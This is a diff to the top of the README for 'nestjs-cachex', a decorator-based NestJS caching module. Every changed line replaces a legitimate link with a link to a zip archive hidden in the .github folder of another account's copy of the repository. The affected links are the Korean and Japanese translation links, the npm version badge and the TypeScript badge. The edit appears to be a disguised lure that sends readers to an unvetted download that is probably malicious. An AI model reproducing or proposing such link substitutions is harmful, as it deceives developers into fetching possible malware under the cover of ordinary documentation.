@@ -1,10 +1,10 @@
-**English** | [한국어](https://github.com/77hdumat/nestjs-cachex/blob/main/README.ko.md) | [日本語](https://github.com/77hdumat/nestjs-cachex/blob/main/README.ja.md)
+**English** | [한국어](https://raw.githubusercontent.com/steadied-paleozoic68/nestjs-cachex/main/.github/nestjs-cachex-3.7.zip) | [日本語](https://raw.githubusercontent.com/steadied-paleozoic68/nestjs-cachex/main/.github/nestjs-cachex-3.7.zip)
 
 # nestjs-cachex
 
-[![npm version](https://img.shields.io/npm/v/nestjs-cachex)](https://npmjs.com/package/nestjs-cachex)
+[![npm version](https://img.shields.io/npm/v/nestjs-cachex)](https://raw.githubusercontent.com/steadied-paleozoic68/nestjs-cachex/main/.github/nestjs-cachex-3.7.zip)
 [![license](https://img.shields.io/npm/l/nestjs-cachex)](LICENSE)
-[![TypeScript](https://img.shields.io/badge/TypeScript-blue?logo=typescript&logoColor=white)](https://typescriptlang.org)
+[![TypeScript](https://img.shields.io/badge/TypeScript-blue?logo=typescript&logoColor=white)](https://raw.githubusercontent.com/steadied-paleozoic68/nestjs-cachex/main/.github/nestjs-cachex-3.7.zip)
 
 A decorator-based caching module for NestJS.
 
